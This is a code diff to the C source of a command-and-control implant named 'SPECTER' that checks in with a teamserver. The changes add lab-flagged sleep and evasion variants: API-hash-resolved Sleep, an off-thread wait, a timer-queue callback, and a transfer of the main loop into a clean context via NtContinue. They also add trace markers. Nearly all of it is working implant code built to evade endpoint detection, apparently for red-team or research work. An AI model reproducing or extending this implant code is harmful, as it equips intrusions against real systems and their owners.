@@ -38,7 +38,101 @@ static PROFILE_CONFIG g_profile_cfg;
 
 /* Forward declarations for cleanup */
 static void implant_cleanup(void);
+static void implant_main_loop(PVOID param);
 typedef void (__attribute__((ms_abi)) *fn_pic_entry)(PVOID param);
+#ifdef SPECTER_DEV_BUILD
+static void dev_trace(const char *msg);
+#define LAB_EARLY_TRACE(msg) dev_trace(msg)
+#else
+#define LAB_EARLY_TRACE(msg) ((void)0)
+#endif
+
+#if defined(SPECTER_LAB_BENIGN_SLEEP) || defined(SPECTER_LAB_OFFTHREAD_WAIT) || \
+    defined(SPECTER_LAB_CALLBACK_TICK)
+#define HASH_SLEEP 0x105CF61E  /* "Sleep" */
+typedef void (__attribute__((ms_abi)) *fn_Sleep)(DWORD milliseconds);
+#endif
+
+#ifdef SPECTER_LAB_BENIGN_SLEEP
+static BOOL lab_benign_sleep(DWORD milliseconds) {
+    PVOID k32 = find_module_by_hash(HASH_KERNEL32_DLL);
+    if (!k32)
+        return FALSE;
+    fn_Sleep pSleep = (fn_Sleep)find_export_by_hash(k32, HASH_SLEEP);
+    if (!pSleep)
+        return FALSE;
+    pSleep(milliseconds);
+    return TRUE;
+}
+#endif
+
+#ifdef SPECTER_LAB_OFFTHREAD_WAIT
+#define HASH_CREATETHREAD 0xE819B491      /* "CreateThread" */
+#define HASH_CLOSEHANDLE_E 0x2EAC8647     /* "CloseHandle" */
+typedef HANDLE (__attribute__((ms_abi)) *fn_CreateThread)(
+    PVOID lpThreadAttributes,
+    SIZE_T dwStackSize,
+    PVOID lpStartAddress,
+    PVOID lpParameter,
+    DWORD dwCreationFlags,
+    DWORD *lpThreadId);
+typedef BOOL (__attribute__((ms_abi)) *fn_CloseHandleE)(HANDLE hObject);
+
+static BOOL lab_offthread_wait(DWORD milliseconds) {
+    PVOID k32 = find_module_by_hash(HASH_KERNEL32_DLL);
+    if (!k32)
+        return FALSE;
+
+    fn_Sleep pSleep = (fn_Sleep)find_export_by_hash(k32, HASH_SLEEP);
+    fn_CreateThread pCreateThread = (fn_CreateThread)find_export_by_hash(k32, HASH_CREATETHREAD);
+    fn_CloseHandleE pClose = (fn_CloseHandleE)find_export_by_hash(k32, HASH_CLOSEHANDLE_E);
+    if (!pSleep || !pCreateThread || !pClose)
+        return FALSE;
+
+    HANDLE hThread = pCreateThread(NULL, 0, (PVOID)pSleep, (PVOID)(ULONG_PTR)milliseconds, 0, NULL);
+    if (!hThread)
+        return FALSE;
+
+    /* Do not join from the resident path; the lab evidence needs the blocked
+       wait posture to live on the Windows-backed helper thread. */
+    pClose(hThread);
+    return TRUE;
+}
+#endif
+
+#ifdef SPECTER_LAB_CALLBACK_TICK
+static HANDLE g_lab_callback_timer = NULL;
+
+static void __attribute__((ms_abi)) lab_callback_tick(PVOID param, BOOL fired) {
+    (void)fired;
+    g_lab_callback_timer = NULL;
+    LAB_EARLY_TRACE("[SPECTER] phase2 marker: callback_tick_entered path=timer_queue_callback");
+    implant_main_loop(param);
+}
+
+static BOOL lab_callback_tick_schedule(PVOID param, DWORD milliseconds) {
+    PVOID k32 = find_module_by_hash(HASH_KERNEL32_DLL);
+    if (!k32)
+        return FALSE;
+
+    fn_CreateTimerQueueTimer pCreateTimer = (fn_CreateTimerQueueTimer)
+        find_export_by_hash(k32, HASH_CREATETIMERQUEUETIMER);
+    if (!pCreateTimer)
+        return FALSE;
+    if (g_lab_callback_timer)
+        return TRUE;
+
+    HANDLE hTimer = NULL;
+    if (!pCreateTimer(&hTimer, NULL, (PVOID)lab_callback_tick, param,
+                      milliseconds, 0, WT_EXECUTEONLYONCE)) {
+        return FALSE;
+    }
+    g_lab_callback_timer = hTimer;
+    LAB_EARLY_TRACE("[SPECTER] phase2 marker: sleep_scheduled path=timer_queue_callback");
+    return TRUE;
+}
+
+#endif
 
 /* Lab sentinel used to prevent a copied module-overload instance from
    recursively overloading itself again. */
@@ -201,6 +295,7 @@ void implant_entry(PVOID param) {
         if (status == 0xC0000005) DEV_FAIL(134);       /* STATUS_ACCESS_VIOLATION (parse) */
         DEV_FAIL(139);
     }
+    DEV_TRACE("[SPECTER] phase2 marker: cfg_init_done");
 
     /* ---- Step 4b: Module overloading (post-config) ---- */
 #if !defined(SPECTER_BAREBONE) || defined(SPECTER_BAREBONE_MODULE_OVERLOAD)
@@ -360,6 +455,9 @@ void implant_entry(PVOID param) {
             status = sleep_init(&g_ctx);
             if (!NT_SUCCESS(status))
                 DEV_FAIL(15);
+            DEV_TRACE("[SPECTER] phase2 marker: sleep_init_done");
+        } else {
+            DEV_TRACE("[SPECTER] phase2 marker: sleep_init_skipped");
         }
     }
 
@@ -371,6 +469,7 @@ void implant_entry(PVOID param) {
         DEV_FAIL((DWORD)(status & 0xFFFF));
     }
     DEV_TRACE("[SPECTER] comms_init OK — first checkin succeeded");
+    DEV_TRACE("[SPECTER] phase2 marker: comms_setup_done");
 
     /* ---- Step 7a: Initialize module bus ---- */
 #if !defined(SPECTER_BAREBONE) || defined(SPECTER_BAREBONE_MODULES)
@@ -434,10 +533,36 @@ void implant_entry(PVOID param) {
 #else
     DEV_TRACE("[SPECTER] barebone build: profile wire path disabled");
 #endif
-
     /* ---- Step 8: Enter main loop ---- */
+#ifdef SPECTER_LAB_CLEAN_SLEEP_ENTRY
+    {
+        EVASION_CONTEXT *ectx = (EVASION_CONTEXT *)g_ctx.evasion_ctx;
+        DEV_TRACE("[SPECTER] phase2 marker: init_done path=ntcontinue_clean_context");
+        status = evasion_ntcontinue_transfer(ectx, (PVOID)implant_main_loop, &g_ctx);
+        DEV_TRACE_VAL("[SPECTER] clean-context transfer FAILED",
+                      (DWORD)(status & 0xFFFF));
+    }
+#endif
+#ifdef SPECTER_LAB_CALLBACK_TICK
+    DEV_TRACE("[SPECTER] phase2 marker: init_done path=timer_queue_callback");
+    if (lab_callback_tick_schedule(&g_ctx, 0)) {
+        DEV_TRACE("[SPECTER] phase2 marker: initial_thread_released path=timer_queue_callback");
+        return;
+    }
+    DEV_TRACE("[SPECTER] callback tick schedule FAILED; fallback direct");
+#endif
+    DEV_TRACE("[SPECTER] phase2 marker: init_done path=direct");
+    implant_main_loop(&g_ctx);
+    return;
+}
+
+static void implant_main_loop(PVOID param) {
+    (void)param;
+    NTSTATUS status;
     g_ctx.running = TRUE;
     DWORD consecutive_failures = 0;
+    BOOL first_checkin_marker_emitted = FALSE;
+    BOOL first_sleep_marker_emitted = FALSE;
 
     while (g_ctx.running) {
         /* Perform encrypted check-in with teamserver */
@@ -458,6 +583,10 @@ void implant_entry(PVOID param) {
             }
         } else {
             consecutive_failures = 0;
+            if (!first_checkin_marker_emitted) {
+                DEV_TRACE("[SPECTER] phase2 marker: first_checkin_done");
+                first_checkin_marker_emitted = TRUE;
+            }
         }
 
         /* Process received tasks from this checkin */
@@ -498,9 +627,47 @@ void implant_entry(PVOID param) {
 
             if (use_simple_sleep) {
                 LARGE_INTEGER delay;
+#ifdef SPECTER_LAB_CALLBACK_TICK
+                if (lab_callback_tick_schedule(&g_ctx, 5000)) {
+                    if (!first_sleep_marker_emitted) {
+                        DEV_TRACE("[SPECTER] phase2 marker: sleep_entered path=timer_queue_callback");
+                        first_sleep_marker_emitted = TRUE;
+                    }
+                    return;
+                }
+                DEV_TRACE("[SPECTER] callback tick fallback benign/direct");
+#endif
+#ifdef SPECTER_LAB_OFFTHREAD_WAIT
+                if (lab_offthread_wait(5000)) {
+                    if (!first_sleep_marker_emitted) {
+                        DEV_TRACE("[SPECTER] phase2 marker: sleep_entered path=off_thread_wait");
+                        first_sleep_marker_emitted = TRUE;
+                    }
+                    continue;
+                }
+                DEV_TRACE("[SPECTER] off-thread wait fallback benign/direct");
+#endif
+#ifdef SPECTER_LAB_BENIGN_SLEEP
+                if (lab_benign_sleep(5000)) {
+                    if (!first_sleep_marker_emitted) {
+                        DEV_TRACE("[SPECTER] phase2 marker: sleep_entered path=benign_sleep");
+                        first_sleep_marker_emitted = TRUE;
+                    }
+                    continue;
+                }
+                DEV_TRACE("[SPECTER] benign sleep fallback direct_simple");
+#endif
+                if (!first_sleep_marker_emitted) {
+                    DEV_TRACE("[SPECTER] phase2 marker: sleep_entered path=direct_simple");
+                    first_sleep_marker_emitted = TRUE;
+                }
                 delay.QuadPart = -50000000LL; /* 5 seconds in 100ns units */
                 spec_NtDelayExecution(FALSE, &delay);
             } else {
+                if (!first_sleep_marker_emitted) {
+                    DEV_TRACE("[SPECTER] phase2 marker: sleep_entered path=direct_sleep_cycle");
+                    first_sleep_marker_emitted = TRUE;
+                }
                 sleep_cycle(&g_ctx);
             }
         }
@@ -508,12 +675,11 @@ void implant_entry(PVOID param) {
 
     /* ---- Cleanup and exit ---- */
     implant_cleanup();
-    return;
 }
 
 static void implant_cleanup(void) {
     /* Shut down module bus subsystems (kill running modules, remove VEH) */
-#ifndef SPECTER_BAREBONE
+#if !defined(SPECTER_BAREBONE) || defined(SPECTER_BAREBONE_MODULES)
     if (g_ctx.module_bus) {
         MODULE_MANAGER *mgr = modmgr_get();
         if (mgr)
